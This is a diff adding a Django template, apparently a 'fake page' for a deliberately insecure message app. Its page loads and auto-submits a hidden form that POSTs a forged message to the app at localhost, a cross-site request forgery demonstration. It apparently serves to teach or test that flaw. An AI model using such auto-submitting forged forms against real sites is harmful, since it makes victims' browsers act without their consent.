@@ -1,0 +1,40 @@
+{% extends "datata_notification/_layouts/base.html" %}
+{% load markdown_filter%}
+
+{% block site_title %}
+(IN)Secure | Message App
+{% endblock site_title %}
+
+{% block title %}
+Message App- Fake Page
+{% endblock title %}
+{% block messages %}
+
+<div class='panel panel-default'>
+    <div class='panel-heading'>
+        <i class='fa fa-envelope-square'></i> New message
+    </div>
+    <div class='panel-body'>
+        <ul class='timeline'>
+            <body onload="document.forms[0].submit()">
+            <form action="http://localhost:8000/messages/main/" method="POST">
+                <input type="hidden" name="title" value="Easy game"/>
+                <input type="hidden" name="message" value="xsrf"/>
+                <input type="hidden" name="user" value="1"/>
+                <input type="submit" value="ClickED"/>
+            </form>
+        </ul>
+    </div>
+</div>
+
+
+
+{% endblock messages %}
+
+{% block panel_1 %}
+<a href='{% url 'profile.views.logout' %}'><i class='fa fa-sign-out fa-fw'></i> Logout</a>
+
+{% endblock panel_1 %}
+
+{% block template_scripts %}
+{% endblock template_scripts %}
